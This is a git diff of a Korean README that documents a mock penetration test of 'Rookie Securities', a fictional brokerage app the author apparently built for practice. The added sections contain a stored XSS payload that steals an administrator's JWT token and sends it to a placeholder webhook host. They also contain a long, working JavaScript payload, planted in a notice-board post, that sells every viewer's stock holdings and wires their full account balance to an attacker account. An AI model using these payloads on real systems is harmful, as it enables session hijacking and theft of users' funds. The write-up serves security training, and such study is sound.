@@ -1,4 +1,4 @@
-### 루키증권 앱 제작후 시나리오 모의해킹 진행하기.
+![image](https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/9c754ed7-b589-410f-bd71-0c1a8d8ab115)### 루키증권 앱 제작후 시나리오 모의해킹 진행하기.
 - 루키증권은 시나리오 모의해킹을 진행하기위해 만든 가상의 증권사 이다.
 
 # 수행 개요
@@ -356,6 +356,241 @@ echo "
 > <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e6d8147d-bedc-45fe-8aa4-1c1dee666fef">
 
 ### 관리자 인증 정보 탈취
+- 크로스 사이트 스크립팅 취약점을 이용해서 문의 게시판에 JWT Token을 획득할 수 있는 스크립트를 작성한다. 획득한 관리자의 JWT Token을 이용하여 관리자 계정으로 로그인을 한다.
+
+| 입력 구문 |
+|---------|
+| <script>let token = window.localStorage.getItem(“SKJWTToken”); let url = “[webhook site url]” try{token=Android.getToken();}catch{}fetch(url+”?name=SKJWTToken&token=”+token);</script> |
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/8bd89b09-b393-4bda-b2ca-e0419c48f3b3">
+
+- 관리자가 문의게시판에서 문의 글 확인 시 관리자의 JWT Token을 탈취하여 해커서버로 전송 한다.
+
+> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/50bfbfb3-aeed-40e2-995f-5d7ef2b9f27d">
+> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/46c37686-1132-4329-95a4-2225f6179128">
+> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/a71e1536-9f6e-4720-afd1-c8a6b379a3fa">
+> <img width="455" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e607b7cc-27e1-4a4a-a452-2ff336ddda86">
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/40d310f1-ae2b-4964-868e-248cb2a4bd17">
+
+- 탈취한 관리자 계정을 이용하여 문의게시판에 접근한다.
+
+### 2차 정보 수집
+- 공지사항 게시판에서 CSRF 취약점이 있는 것을 확인한다. 공지사항 페이지에서 공지사항 글쓰기 폼을 가져와서 글 내용에 포함시켜서 글을 작성해 보면 글쓰기 폼이 작성되는 것을 확인할 수 있다.
+
+> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/abd4367e-bb3a-41be-992d-6ed0fe6f1100">
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/f226fc77-928f-4715-bdb4-62ef01a67b41">
+
+- 마이페이지에서 송금할 때를 Burp로 잡아서 E2E 암호화에 RSA 키가 필요한 것을 확인한다.
+
+> <img width="456" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/78dc3150-3af6-4a52-9c04-479e054888cb">
+
+- 이를 바탕으로 글을 확인한 사용자의 RSA 키와 보유 주식 수, 계좌 잔액을 가져오는 스크립트 작성한다.
+
+### E2E 우회
+- 글을 확인한 사용자의 RSA 키와 보유 주식 수까지 확인할 수 있는 스크립트와 계좌 잔액을 확인할 수 있는 스크립트를 작성하면 확인이 가능하다.
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/7b189253-4adb-477e-b765-bedf6482f418">
+
+### 최종 공격 수행
+- 공지사항을 통해 공지사항 글을 확인한 모든 사용자의 보유 주식을 판매하고 계좌의 잔액을 전부 해커에게 송금하는 스크립트를 작성한 후 공지사항을 게시한다.
+
+```
+<script src="/js/jquery.min.js"></script>
+<script src="/js/rsa/jsbn.js"></script>
+<script src="/js/rsa/prng4.js"></script>
+<script src="/js/rsa/rng.js"></script>
+<script src="/js/rsa/rsa.js"></script>
+ 
+<script>
+    async function getStock() {
+        const stockCode_list = ['AAPL', 'AMZN', 'FB', 'GOOGL', 'MSFT'];
+        const stockName_list = ['Apple', 'Amazon.com', 'Meta', 'Alphabet', 'Microsoft'];
+ 
+        for (let i = 0; i < stockCode_list.length; i++) {
+            const stockCode = stockCode_list[i];
+            const stockName = stockName_list[i];
+            try {
+                const response = await fetch(`https://www.rookiestock.com/detailstock?stockCode=${stockCode}&stockName=${stockName}`, {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'text/plain'
+                    }
+                });
+ 
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+ 
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, "text/html");
+                const userIdInput = doc.querySelector("#USER_ID");
+                const modulusMatch = html.match(/id="RSAModulus"\s+value="([^"]+)"/);
+                const Exponent = html.match(/id="RSAExponent"\s+value="([^"]+)"/);
+                const match = html.match(/own\.innerHTML \+= "[^`]*`(\d+)`/);
+                let haveUnit = "";
+                if (match) {
+                    haveUnit = match[1]; 
+                    console.log('보유 주식 수:', haveUnit);
+                } else {
+                    console.log('매치되는 데이터가 없습니다.');
+                }
+                if (userIdInput && modulusMatch && Exponent) {
+                    const RSAModulus = modulusMatch[1];
+                    const RSAExponent = Exponent[1];
+                    const userIdValue = userIdInput.value;
+                    console.log('Extracted RSAModulus:', RSAModulus);
+                    console.log('Extracted RSAExponent:', RSAExponent);
+                    console.log('Extracted USER_ID:', userIdValue);
+                    await performAjaxSell(RSAModulus, RSAExponent, userIdValue, stockCode, haveUnit);
+                } else {
+                    console.log('USER_ID input not found in the data.');
+                }
+            } catch (error) {
+                console.error('Fetch error:', error);
+            }
+        }
+    }
+ 
+    async function sendMoney() {
+        try {
+            const response = await fetch('https://www.rookiestock.com/mypage', {
+                method: 'GET',
+                headers: {
+                    'Accept': 'text/plain'
+                }
+            });
+ 
+            if (!response.ok) {
+                throw new Error('Network response was not ok');
+            }
+ 
+            const res = await response.text();
+            const balanceRegex = /"ACCOUNT_BALANCE":(\d+)/;
+            const match = res.match(balanceRegex);
+ 
+            if (match) {
+                var bal = match[1]; 
+                console.log("ACCOUNT_BALANCE value:", bal);
+ 
+                const transfer_res = await fetch('https://www.rookiestock.com/mypage/transfer', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'text/plain'
+                    }
+                });
+ 
+                if (!transfer_res.ok) {
+                    throw new Error('Network response was not ok');
+                }
+ 
+                const tranfer_text = await transfer_res.text();
+                const userIdInput = 'hacker'; 
+                const modulusMatch = tranfer_text.match(/id="RSAModulus"\s+value="([^"]+)"/);
+                const Exponent = tranfer_text.match(/id="RSAExponent"\s+value="([^"]+)"/);
+ 
+                if (userIdInput && modulusMatch && Exponent) {
+                    const RSAModulus = modulusMatch[1];
+                    const RSAExponent = Exponent[1]; 
+                    await ajaxSend(RSAModulus, RSAExponent, userIdInput, bal);
+                } else {
+                    console.log("Required data not found in transfer response.");
+                }
+            } else {
+                console.log("ACCOUNT_BALANCE not found.");
+            }
+        } catch (error) {
+            console.error('Fetch error:', error);
+        }
+    }
+ 
+    async function main() {
+        await getStock();
+        await sendMoney();
+    }
+ 
+    main();
+ 
+    async function performAjaxSell(RSAModulus, RSAExponent, UserId, stock, haveUnit) {
+    var PRICE = '100';
+    var UNIT = haveUnit;
+    var USERID = UserId;
+    var STOCK = stock;
+ 
+    const rsa = new RSAKey();
+    rsa.setPublic(RSAModulus, RSAExponent);
+    let data = {
+        stock: STOCK,
+        price: PRICE,
+        userId: USERID,
+        unit: UNIT
+    };
+    let e2eData = rsa.encrypt(JSON.stringify(data));
+ 
+// Promise를 반환하는 jQuery Ajax 사용
+    try {
+        const response = await $.ajax({
+            url: '/detailSell',
+            type: 'POST',
+            contentType: 'application/json',
+            data: e2eData
+        });
+        alert(response.MSG);
+    } catch (error) {
+        alert('오류 발생: ' + error.statusText);
+    }
+}
+ 
+async function ajaxSend(RSAModulus, RSAExponent, user_nm, PRICE) {
+    const rsa = new RSAKey();
+    rsa.setPublic(RSAModulus, RSAExponent);
+    let data = {
+        name: user_nm,
+        account_number: '909089-4923112',
+        price: PRICE,
+        transfer_bankagency: 'RK루키은행'
+    };
+    let e2eData = rsa.encrypt(JSON.stringify(data));
+    // Promise를 반환하는 jQuery Ajax 사용
+    try {
+        const response = await $.ajax({
+            url: '/mypage/send',
+            type: 'POST',
+            contentType: 'application/json',
+            data: e2eData
+        });
+        alert(response.body);
+    } catch (error) {
+        alert('오류 발생: ' + error.statusText);
+    }
+}
+ 
+</script>
+
+```
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/bf0bd24c-0352-4450-83c4-5080989eb7bf">
+
+- 코드를 포함한 공지사항을 작성한 뒤 업로드하고 일반 사용자가 공지사항을 확인한다. 그러면 사용자의 보유 주식이 전부 판매되고 계좌 잔액이 모두 공격자에게 송금된다.
+
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/e60c99ea-f416-4705-967b-0dd3b07e51a7">
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/787a0cba-8862-4998-8a93-c4c9212db8f2">
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/200b5e42-fcb3-4fe9-b9c2-17e1e6fbef8f">
+> <img width="257" alt="image" src="https://github.com/hanmin0512/rookiestock_hacking/assets/37041208/c767f00b-e5de-4eb3-9697-bc19d816c01a">
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
